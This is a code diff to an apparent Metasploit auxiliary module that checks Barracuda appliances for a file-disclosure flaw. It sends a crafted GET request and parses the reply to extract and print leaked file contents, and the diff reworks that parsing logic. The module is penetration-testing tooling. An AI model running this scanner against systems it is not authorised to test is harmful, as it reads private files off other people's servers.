@@ -60,26 +60,35 @@ class Metasploit3 < Msf::Auxiliary
 
 		print_status("#{target_url} - Barracuda - Checking if remote server is vulnerable")
 
-		res = send_request_raw({
-			'method'  => 'GET',
-			'uri'     => "#{uri}" + payload,
-		}, 25)
+		res = send_request_raw(
+			{
+				'method'  => 'GET',
+				'uri'     => uri + payload,
+			}, 25)
 
 		if (res and res.code == 200 and res.body)
-			if (res.body.match(/p\>(.*)\<\/p/im).to_s.size > 10)
-				file_data = $1
-				print_good("#{target_url} - Barracuda - Vulnerable")
-				print_good("#{target_url} - Barracuda - File Output: \n" + file_data + "\r\n")
+			if res.body.match(/\<html\>(.*)\<\/html\>/im)
+				html = $1
 
-			elsif res.body =~ /help_page/
-				print_error("#{target_url} - Barracuda - Not Vulnerable")
+				if res.body =~ /barracuda\.css/
+					if html.length > 100
+						file_data = html.gsub(%r{</?[^>]+?>}, '')
+
+						print_good("#{target_url} - Barracuda - Vulnerable")
+						print_good("#{target_url} - Barracuda - File Output:\n" + file_data + "\n")
+					else
+						print_error("#{target_url} - Barracuda - Not vulnerable: HTML too short?")
+					end
+				elsif res.body =~ /help_page/
+					print_error("#{target_url} - Barracuda - Not vulnerable: Patched?")
+				else
+					print_error("#{target_url} - Barracuda - File not found or permission denied")
+				end
 			else
-				print_error("#{target_url} - Barracuda - File not found or permission denied")
+				print_error("#{target_url} - Barracuda - No HTML was returned")
 			end
-
 		else
 			print_error("#{target_url} - Barracuda - Unrecognized #{res.code} response")
-			return :abort
 		end
 
 	rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
